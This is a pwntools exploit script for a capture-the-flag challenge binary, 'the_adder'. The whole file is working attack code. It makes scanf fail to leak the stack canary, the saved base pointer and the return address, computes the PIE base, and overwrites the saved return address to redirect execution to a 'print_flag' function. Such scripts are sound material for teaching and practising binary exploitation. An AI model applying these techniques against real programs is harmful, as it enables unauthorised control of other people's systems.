from pwn import *

context.arch = "amd64"

CHALL_PATH = "./the_adder"

CHALL = ELF("./the_adder")

COMMANDS = '''
brva 0x14FB
c
'''

if args.REMOTE:
    pass
else:
    if args.GDB:
       r = gdb.debug(CHALL_PATH, gdbscript=COMMANDS)
    else:
        r = process(CHALL_PATH) 


#the challenge is based on let the scanf crash

for _ in range(9):
    r.recvuntil(b">")
    r.sendline(b"1")
    r.recvuntil(b"Number: ")
    r.sendline(b"1")
    r.recvuntil(b"[y/n]\n")
    r.sendline(b"y")
r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"Number: ")
r.sendline(b"-9")
r.recvuntil(b"[y/n]\n")
r.sendline(b"y")

#we add 1 to the previous until the last iteration in which we subbtract 9 to have 0 as a sum to the canary

#leak the canary
r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"Number: ")
r.sendline(b"a")
r.recvuntil(b"to add ")
canary = r.recvuntil(b"?")[:-1]
canary = int(canary)
canary_hex = hex(canary)
print("Canary: ",canary_hex)
r.recvuntil(b"[y/n]\n")
r.sendline(b"n")
#we leak the canary by making the scanf fail


#put the canary in the same place
r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"Number: ")
r.sendline(bytes(str(canary),'utf-8'))
r.recvuntil(b"[y/n]\n")
r.sendline(b"y")

#leak the saved_ebp
r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"Number: ")
r.sendline(b"a")
r.recvuntil(b"to add ")
saved_ebp = r.recvuntil(b"?")[:-1]
saved_ebp = int(saved_ebp)
saved_ebp_hex = hex(saved_ebp)
print("Saved_EBP: ",saved_ebp_hex)
r.recvuntil(b"[y/n]\n")
r.sendline(b"n")

#put the leaked saved_ebp on the stack again
r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"Number: ")
r.sendline(bytes(str(saved_ebp - canary),'utf-8'))
r.recvuntil(b"[y/n]\n")
r.sendline(b"y")
#we send the difference between saved_ebp and canary because the binary will add the content of the previous memory address

#leak saved_eip
r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"Number: ")
r.sendline(b"a")
r.recvuntil(b"to add ")
saved_eip = r.recvuntil(b"?")[:-1]
saved_eip = int(saved_eip)
saved_eip_hex = hex(saved_eip)
print("Saved_EIP: ",saved_eip_hex)
r.recvuntil(b"[y/n]\n")
r.sendline(b"n")

saved_eip_main = int(saved_eip) -39
saved_eip_main_hex = hex(saved_eip_main)
base_main = int(saved_eip_main_hex,16) #computing base address of main from main+39
CHALL.address = base_main - CHALL.symbols['main']
print_flag_address = CHALL.symbols['print_flag']
print("Base address: ", hex(CHALL.address))
print("print_flag: ",hex(print_flag_address))

difference = saved_eip - print_flag_address
#insert address of print_flag as saved EIP
r.recvuntil(b">")
r.sendline(b"1")
r.recvuntil(b"Number: ")
r.sendline(bytes(str(saved_eip_main - saved_ebp + difference - 0x1f5),'utf-8'))
r.recvuntil(b"[y/n]\n")
r.sendline(b"y")

#quit to jump to saved_eip
r.recvuntil(b">")
r.sendline(b"3")


r.interactive()
